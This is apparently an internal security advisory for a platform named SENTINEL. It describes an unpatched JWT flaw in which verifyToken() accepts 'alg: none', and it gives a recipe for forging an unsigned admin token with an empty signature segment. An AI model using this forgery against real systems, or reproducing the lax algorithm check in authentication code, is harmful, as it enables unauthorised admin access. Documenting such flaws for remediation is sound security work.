─────────────────────────────────────────────────────────────
⚠  RESTRICTED CONTENT — FOR ADMINISTRATOR REVIEW ONLY  ⚠
─────────────────────────────────────────────────────────────
This document contains details about known vulnerabilities
in SENTINEL's own JWT implementation. It is intended solely
for the security team and should not be accessible to
standard or pro tier users.

─────────────────────────────────────────────────────────────
PLATFORM VULNERABILITY DETAILS (INTERNAL)
─────────────────────────────────────────────────────────────
SENTINEL's verifyToken() function in server/auth.ts accepts
any algorithm value in the JWT header.  When alg is NOT
"HS256", the signature check is bypassed entirely.

Forge any role without the secret:
  HEADER  = base64url({"alg":"none","typ":"JWT"})
  PAYLOAD = base64url({"userId":1,"username":"admin",
                        "role":"admin","plan":"enterprise"})
  TOKEN   = HEADER.PAYLOAD.

The empty third segment is accepted as a valid token.
This grants full admin access to all protected endpoints.

Internal ticket: SENT-0021
Status: OPEN — remediation pending Q2 2026 sprint
Priority: CRITICAL
─────────────────────────────────────────────────────────────
SENTINEL PLATFORM — RESTRICTED — DO NOT DISTRIBUTE
